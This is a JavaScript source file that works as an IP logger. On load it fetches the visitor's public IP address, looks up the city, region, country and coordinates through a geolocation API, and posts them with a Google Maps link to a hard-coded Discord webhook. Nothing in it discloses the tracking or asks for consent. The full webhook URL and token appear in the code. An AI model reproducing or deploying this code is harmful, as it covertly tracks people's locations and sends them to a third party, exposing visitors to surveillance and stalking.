const ipifyAPI = "https://api.ipify.org?format=json";
const ipstackAPI = "http://api.ipstack.com/";
const apiKey = "YOUR_API_KEY"; // Replace with your ipstack API key
const webhookURL =
  "https://discord.com/api/webhooks/1367683410989940756/cx2uFFLodvi3paS-hUHxv9waFC4LG2FEqRGLs0bO8nV3CQ-qvPnp8NYbsmiMkMHRteA5";

// Function to get the current Georgian date and time (UTC+4)
function getGeorgianTime() {
  const now = new Date();
  const georgianOffset = 4; // UTC+4
  const georgianTime = new Date(
    now.getTime() + georgianOffset * 60 * 60 * 1000
  );

  const year = georgianTime.getFullYear();
  const month = String(georgianTime.getMonth() + 1).padStart(2, "0");
  const day = String(georgianTime.getDate()).padStart(2, "0");
  const hours = String(georgianTime.getHours()).padStart(2, "0");
  const minutes = String(georgianTime.getMinutes()).padStart(2, "0");
  const seconds = String(georgianTime.getSeconds()).padStart(2, "0");

  return `${year}-${month}-${day} ${hours}:${minutes}:${seconds} (Georgian Time)`;
}

// Function to fetch the user's public IP address
async function getIP() {
  try {
    const response = await fetch(ipifyAPI);
    const data = await response.json();
    if (!data.ip) {
      console.error("No IP data received from ipify.");
      return null;
    }
    console.log("Fetched IP:", data.ip); // Log the fetched IP
    return data.ip;
  } catch (error) {
    console.error("Error fetching IP:", error);
    return null;
  }
}

// Function to fetch geolocation data for the given IP address using ipstack
async function getGeolocation(ip) {
  try {
    const response = await fetch(`${ipstackAPI}${ip}?access_key=${apiKey}`);
    const data = await response.json();
    if (data.error) {
      console.error("Error fetching geolocation:", data.error.info);
      return null;
    }
    console.log("Full Geolocation Data:", data); // Log full geolocation data for debugging
    return {
      city: data.city,
      region: data.region_name,
      country: data.country_name,
      lat: data.latitude,
      lon: data.longitude,
    };
  } catch (error) {
    console.error("Error fetching geolocation:", error);
    return null;
  }
}

// Function to send IP and location data to Discord webhook
async function sendToDiscord(ip, location) {
  if (!ip) {
    console.error("IP address is null or undefined.");
    return;
  }

  const timestamp = getGeorgianTime();

  const locationMessage = location
    ? `Location: ${location.city}, ${location.region}, ${location.country}\nMap: [Google Maps](https://www.google.com/maps?q=${location.lat},${location.lon})`
    : "Location: Could not fetch location or map.\nMap: N/A";

  const payload = {
    content: `IP Address: ${ip}\nTimestamp: ${timestamp}\n${locationMessage}`,
  };

  try {
    const response = await fetch(webhookURL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    });

    if (response.ok) {
      console.log("IP and location sent to Discord successfully!");
    } else {
      console.error("Error sending data to Discord:", response.statusText);
    }
  } catch (error) {
    console.error("Error sending data to Discord:", error);
  }
}

// Main function to fetch IP, geolocation, and send to Discord
async function main() {
  const ip = await getIP();
  if (ip) {
    const location = await getGeolocation(ip);
    if (location) {
      await sendToDiscord(ip, location);
    } else {
      console.error("Could not fetch location.");
    }
  } else {
    console.error("Could not retrieve IP address.");
  }
}

main();
